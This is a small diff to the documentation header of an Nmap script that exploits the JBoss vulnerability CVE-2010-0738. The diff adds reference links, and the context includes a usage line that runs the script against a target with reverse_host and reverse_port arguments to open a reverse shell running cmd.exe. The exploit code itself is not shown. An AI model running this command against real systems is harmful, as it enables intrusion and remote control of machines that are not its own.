@@ -9,6 +9,11 @@ reverse shell on the target machine.
 
 This exploit is a rewrite to NSE of the Kingcope's perl exploit (daytona_bsh.pl).
 
+More information: 
+http://www.exploit-db.com/exploits/16274/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0738
+http://www.securityfocus.com/bid/39710
+
 ]]
 
 -- @usage nmap -p8080 -sV --script jboss-vuln-cve2010-0738 --script-args="reverse_host=192.168.1.204,reverse_port=5555,cmd=cmd.exe" <target>
